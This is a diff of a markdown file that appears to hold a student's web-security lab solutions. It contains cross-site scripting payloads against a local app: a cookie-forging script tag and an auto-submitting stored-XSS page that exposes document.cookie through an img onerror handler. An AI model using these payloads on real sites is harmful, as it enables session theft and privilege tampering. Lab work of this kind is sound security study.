@@ -23,7 +23,40 @@ var payload = "document.cookie='Role-Identifier=Administrator; path=/'; localSto
 fetch("http://localhost:7149/admin/debug-test?DebugTest=<script>" + encodeURIComponent(payload) + "<script>", {method: "POST"});
 ```
 
-# XSS Payload
+# XSS Payload (Stored)
+```
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Flag2</title>
+  </head>
+  <body>
+    <script>
+      fetch("http://localhost:7149/api/review/6", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "*/*"
+        },
+        body: JSON.stringify({
+          title: "Echo found in stack trace: possibly edible.",
+          reviewer: "904160213",  // Use your GTID
+          body: "<img src=x onerror=\"document.querySelector('h5').innerText=document.cookie\">",
+          rating: 5,
+          recommended: true,
+          bookId: "6"
+        })
+      }).then(() => {
+        // Redirect only after post
+        window.location.href = "http://localhost:7149/book/6";
+      });
+    </script>
+  </body>
+</html>
+```
+
+# XSS Payload (Reflective)
 ```JavaScript
 <!DOCTYPE html>
 <html>
